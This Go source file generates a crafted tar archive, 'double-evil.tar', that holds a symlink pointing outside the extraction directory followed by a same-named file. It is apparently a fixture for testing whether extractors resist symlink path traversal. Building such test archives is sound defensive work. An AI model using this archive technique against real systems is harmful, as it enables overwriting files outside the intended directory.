package main

import (
	"archive/tar"
	"fmt"
	"log"
	"os"
	"time"
)

func main() {
	// Create a file to write our archive to.
	tarname := "double-evil.tar"
	fw, err := os.Create(tarname)
	if nil != err {
		log.Fatal(err)
		return
	}

	// Create a new tar archive.
	tw := tar.NewWriter(fw)

	// Write the evil symlink, it points outside of the target directory
	hdr := &tar.Header{
		Name:     "bad/file.txt",
		Mode:     0644,
		Typeflag: tar.TypeSymlink,
		Linkname: "../../badfile.txt",
		ModTime:  time.Now(),
	}
	if err := tw.WriteHeader(hdr); err != nil {
		log.Fatal(err)
		return
	}

	// Write safe files to the archive.
	var files = []struct {
		Name, Body string
	}{
		{"goodfile.txt", "hello world"},
		{"morefile.txt", "hello world"},
		{"bad/file.txt", "Mwa-ha-ha"},
	}
	for _, file := range files {
		hdr := &tar.Header{
			Name:    file.Name,
			Mode:    0644,
			Size:    int64(len(file.Body)),
			ModTime: time.Now(),
		}

		if err := tw.WriteHeader(hdr); err != nil {
			log.Fatal(err)
			return
		}

		if _, err := tw.Write([]byte(file.Body)); err != nil {
			log.Fatal(err)
		}
	}

	// Close the in-memory archive so that it writes trailing data
	err = tw.Close()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("Wrote %s\n", tarname)

	// close the on-disk archive so that it flushes all bytes
	if err = fw.Close(); err != nil {
		log.Fatal(err)
		return
	}
}
